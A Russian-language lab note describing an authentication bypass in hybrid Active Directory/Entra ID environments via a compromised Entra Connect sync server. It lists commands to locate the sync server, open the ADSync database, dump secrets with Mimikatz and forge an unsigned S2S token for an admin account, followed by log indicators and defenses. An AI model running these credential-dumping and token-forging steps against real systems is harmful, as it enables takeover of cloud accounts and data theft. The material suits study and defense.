# Hybrid AD Authentication Bypass

**Источник:** SDT Research, Recent  
**Новизна в 2025:** Фокус на Entra Connect; атака позволяет генерировать неподписанные S2S-токены для доступа к облачным ресурсам, минуя стандартную аутентификацию.

---

## 🎯 Цель атаки
Обойти аутентификацию в гибридной среде Active Directory + Entra ID (Azure AD) для кражи данных и получения доступа к облачным ресурсам.

## 📋 Описание
В гибридных средах используется Entra Connect (Azure AD Connect) для синхронизации учетных записей.  
При определённых условиях атакующий может:
- Скомпрометировать сервер синхронизации.
- Сгенерировать S2S-токены без подписи (unsigned).
- Получить доступ к облачным сервисам от имени пользователей или администраторов.

## ⚠ Условия эксплуатации
- Доступ к серверу Azure AD Connect (sync server).
- Доступ к ключам шифрования или базе данных синхронизации.
- Отсутствие HSM или аппаратной защиты ключей.

## 🔹 Пошагово в лаборатории
> ⚠ Только в тестовой среде!

1. Определить сервер синхронизации:
```powershell
Get-ADComputer -Filter {Name -like "*SYNC*"}
```
2. Получить доступ к базе данных синхронизации:
```powershell
sqlcmd -S syncserver\ADSync -d ADSync
```
3. Извлечь ключи шифрования (пример с Mimikatz):
```powershell
mimikatz "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```
4. Использовать ключ для генерации unsigned S2S-токена (пример с python-скриптом):
```bash
python3 generate_s2s_token.py --key <extracted_key> --user admin@domain.com
```

## 📊 Признаки в логах и мониторинг
- Логи доступа к ADSync DB вне плановых процедур.
- Запросы токенов без соответствующих событий входа в AD.
- Аномальные входы в облачные сервисы из внутренней сети.

## 🛡 Меры защиты
- Разместить Entra Connect на выделенном защищенном сервере.
- Использовать HSM для хранения ключей.
- Ограничить доступ к ADSync DB.
- Мониторить события входа и генерации токенов.

## 🔗 Источники
- SDT Research — Hybrid AD Authentication Bypass

---

## 🔍 Разбор команд

### 1. Определение сервера синхронизации
```powershell
Get-ADComputer -Filter {Name -like "*SYNC*"}
```
- Ищет в AD серверы, имя которых содержит "SYNC".

### 2. Подключение к базе ADSync
```powershell
sqlcmd -S syncserver\ADSync -d ADSync
```
- Подключается к экземпляру SQL Server, на котором хранится база синхронизации.

### 3. Извлечение секретов Mimikatz
```powershell
mimikatz "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```
- **`privilege::debug`** — повышает привилегии для доступа к LSASS.
- **`token::elevate`** — поднимает токен до SYSTEM.
- **`lsadump::secrets`** — извлекает секреты, включая ключи шифрования.

### 4. Генерация S2S-токена
```bash
python3 generate_s2s_token.py --key <extracted_key> --user admin@domain.com
```
- **`--key`** — извлечённый ключ.
- **`--user`** — пользователь, от имени которого создаётся токен.
